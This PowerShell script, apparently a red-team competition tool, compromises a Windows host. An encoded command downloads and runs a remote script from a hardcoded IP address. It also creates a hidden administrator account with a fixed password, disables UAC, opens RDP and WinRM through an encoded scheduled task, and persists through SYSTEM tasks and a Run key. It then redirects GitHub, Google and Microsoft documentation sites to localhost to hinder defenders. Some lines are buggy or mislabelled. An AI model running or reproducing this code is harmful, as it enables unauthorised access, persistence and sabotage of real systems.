# Author: Rebel

function persist([string]$test){	
	$runpath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
	$filepath = ''
	Try{
		$filepath = "C:\Windows\security\EDP"
		$test | Out-File -FilePath $filepath -NoClobber -Force | Out-Null
	}
	Catch{
		$filepath = "C:\Program Files (x86)\Common Files"
        New-Item -Path $filepath -Name "wire" -ItemType "directory" 
        $filepath += $filepath + "\wire"
		$test | Out-File -FilePath $filepath -NoClobber -Force | Out-Null

	}
	New-ItemProperty -Path $runpath -Name "covShark" -Value $funpath -PropertyType "String"

}

function add_task([string]$test){
	$cmd = @"
bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT0iQWxsb3cgUkRQIHdpdGgg
VURQIDopIiBkaXI9aW4gYWN0aW9uPWFsbG93IHByb3RvY29sPVVEUCBsb2NhbHBvcnQ9MzM4OQoJ
bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT1SRFAgb24gVURQIDopIiBk
aXI9b3V0IGFjdGlvbj1hbGxvdyBwcm90b2NvbD1VRFAgbG9jYWxwb3J0PTMzODkKCW5ldHNoIGFk
dmZpcmV3YWxsIGZpcmV3YWxsIGFkZCBydWxlIG5hbWU9IlJEUCBvbiBUQ1AgOikiIGRpcj1pbiBh
Y3Rpb249YWxsb3cgcHJvdG9jb2w9VENQIGxvY2FscG9ydD0zMzg5CgluZXRzaCBhZHZmaXJld2Fs
bCBmaXJld2FsbCBhZGQgcnVsZSBuYW1lPSJBbGxvdyBSRFAgd2l0aCBUQ1AgOikiIGRpcj1vdXQg
YWN0aW9uPWFsbG93IHByb3RvY29sPVRDUCBsb2NhbHBvcnQ9MzM4OQoJbmV0IHN0YXJ0IHdpbnJt
Cg==
"@ 

  
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
	$description = "Register this computer if the computer is already joined to an Active Directory domain."
    $taskName = "Automatic-Device-Joining"
    $action = New-ScheduledTaskAction -execute "powershell.exe -noP -NonI -Exec Bypass -W Hidden -enc $($cmd)"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 1000)
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable 
    Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Setting $settings -description $description -Principal $principal
    Set-ScheduledTask $taskName -Trigger $trigger

    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
	$description = "Register this computer if the computer is already joined to an Active Directory domain."
    $taskName = "Automatic-Device-Joining"
    $action = New-ScheduledTaskAction -execute "powershell.exe $($test)"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 1000)
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable 
    Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Setting $settings -description $description -Principal $principal
    Set-ScheduledTask $taskName -Trigger $trigger


    $second_cmd = 'powershell.exe -noP -NonI -Exec Bypass -W Hidden (New-Object -ComObject Wscript.Shell).Popup("Sharks like Schezuan Sauce",0,"Important Fact of the Day",0x1) | Out-Null'
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
	$description = "Sharks have to eat as well"
    $taskName = "Display Important Red Team Message"
    $action = New-ScheduledTaskAction -execute "powershell.exe -noP -NonI -Exec Bypass -W Hidden -enc $($second_cmd)"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 1000)
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable 
    Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Setting $settings -description $description -Principal $principal
    Set-ScheduledTask $taskName -Trigger $trigger
}

function modify_hosts{
	$hosts_path = "C:\Windows\System32\drivers\etc\hosts"
    $local = "127.0.0.1"
    $text = @"
    $local      github.com
    $local      termbin.com
    $local      pastebin.com
    $local      tinyurl.com
    $local      bitly.com 
    $local      google.com
	$local		stackoverflow.com
	$local 		raw.githubusercontent.com
	$local 		chocolatey.org
	$local 		docs.microsoft.com
"@ 
	# sinkhole things they don't need :)
	Add-Content -Path $hosts_path -Value $text

}

function add_backup{
	$Password = (ConvertTo-SecureString -AsPlainText "KiwisAreNotFun!" -Force)
	New-LocalUser "Kiwi" -Password $Password -FullName "Kiwi" -Description "Eats fruit, likes Ben Delpy"
	Add-LocalGroupMember -Group "Administrators" -Member "kiwi"
}


function enable{
	Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1
	# enable rdp 
	Try{
		New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force | Out-Null
		#disable credential guard
		
	}
	Catch{
		Set-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force | Out-Null
	}
	$path = "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings"
	Try{
		New-ItemProperty -Path $path -Name "Enabled" -Value 1 -PropertyType "DWord" | Out-Null
		# Enable Windows script host 
	}
	Catch{
		Set-ItemProperty -Path $path -Name "Enabled" -Value 1 | Out-Null
	}
}

function beacon([string]$test){
   powershell.exe -noP -NonI -Exec Bypass -W Hidden -enc $($test) 
}

function main{
	$test = "powershell -Sta -Nop -Window Hidden -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADkALgAyADEALgAyADIAOAAuADEANAAwAC8AaABvAG0AZQAvAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIALwBjAG8AdgBkAGUAcABsAG8AeQAvAGYAdQBuAC4AcABzADEAJwApAA=="
    beacon($test)
	add_backup
	modify_hosts
	enable
    add_task($test)
	persist($test)
}

main
